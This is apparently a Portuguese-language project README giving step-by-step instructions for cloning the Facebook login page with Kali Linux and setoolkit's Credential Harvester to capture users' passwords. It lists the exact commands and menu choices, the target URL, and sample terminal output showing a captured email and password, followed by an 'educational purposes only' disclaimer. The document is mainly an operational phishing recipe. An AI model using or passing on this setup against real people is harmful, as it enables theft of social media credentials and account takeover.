# Phishing para captura de senhas do Facebook
Este projeto demonstra como configurar um phishing para capturar credenciais do Facebook utilizando o Kali Linux e a ferramenta setoolkit. 

### Ferramentas

- Kali Linux
- setoolkit

### Configurando o Phishing no Kali Linux

Siga os passos abaixo para configurar um phishing utilizando o setoolkit:

1. Obtenha acesso root:
   ```bash
   sudo su
   ```

2. Inicie o setoolkit:
   ```bash
   setoolkit
   ```

3. Escolha o tipo de ataque: **Social-Engineering Attacks**

4. Selecione o vetor de ataque: **Web Site Attack Vectors**

5. Escolha o método de ataque: **Credential Harvester Attack Method**

6. Selecione o método de ataque: **Site Cloner**

7. Obtenha o endereço IP da sua máquina:
   ```bash
   ifconfig
   ```
   Copie o endereço exibido, geralmente listado em `inet` sob a interface de rede (por exemplo, `eth0` ou `wlan0`).

8. Insira a URL para clonar:
   ```
   http://www.facebook.com
   ```

O setoolkit agora irá clonar o site do Facebook e configurá-lo para capturar credenciais.

## Resultados

- Após configurar o phishing, qualquer credencial inserida no site clonado será registrada e exibida na interface do terminal do setoolkit.

```plaintext
[*] Credential Harvester is running...
[*] Waiting for credentials to be entered...

[*] POSSIBLE USERNAME FIELD FOUND: skip_api_login=
PARAM: signed_next=
PARAM: trynum=1
PARAM: timezone=180
PARAM: lgndim=eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdHdJdG1rYWMw
PARAM: lgnd=112556_dsDS
PARAM: tgnjs=1668021982
[*] POSSIBLE USERNAME FIELD FOUND: email=aninha88@gmail.com
[*] POSSIBLE PASSWORD FIELD FOUND: pass=seguranca2022!
PARAM: prefill_contact_point=
PARAM: prefill_source=
PARAM: prefill_type=1
PARAM: first_prefill_source=

```

## Observação Importante

- Este projeto é apenas para fins educacionais.
- Não use este material para fins ilegais.
- Sempre solicite autorização antes de realizar testes de segurança em sistemas ou redes que não sejam suas.

---

**Disclaimer:** O autor deste projeto não se responsabiliza por qualquer uso indevido ou atividade ilegal realizada com este material.
